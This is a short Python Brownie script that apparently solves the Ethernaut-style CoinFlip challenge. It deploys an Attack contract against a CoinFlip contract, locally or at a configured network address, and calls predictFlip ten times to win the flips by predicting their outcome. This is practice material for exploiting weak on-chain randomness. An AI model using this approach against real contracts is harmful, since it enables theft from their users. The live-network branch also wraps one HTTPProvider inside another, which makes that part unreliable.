from brownie import CoinFlip, Attack, network, Contract, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        coinflip = CoinFlip.deploy({"from": get_account(index=1)})

        attack = Attack.deploy(coinflip, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        coinflip = Contract.from_abi(
            CoinFlip._name,
            config["networks"][network.show_active()]["coinflip"],
            CoinFlip.abi,
        )

        attack = Attack.deploy(coinflip, {"from": account})

    for _ in range(10):

        attack.predictFlip(
            {"from": account, "gas_limit": 100000, "allow_revert": True}
        ).wait(1)

    print(f"Consecutive wins is {coinflip.consecutiveWins()}")


def main():
    attack()
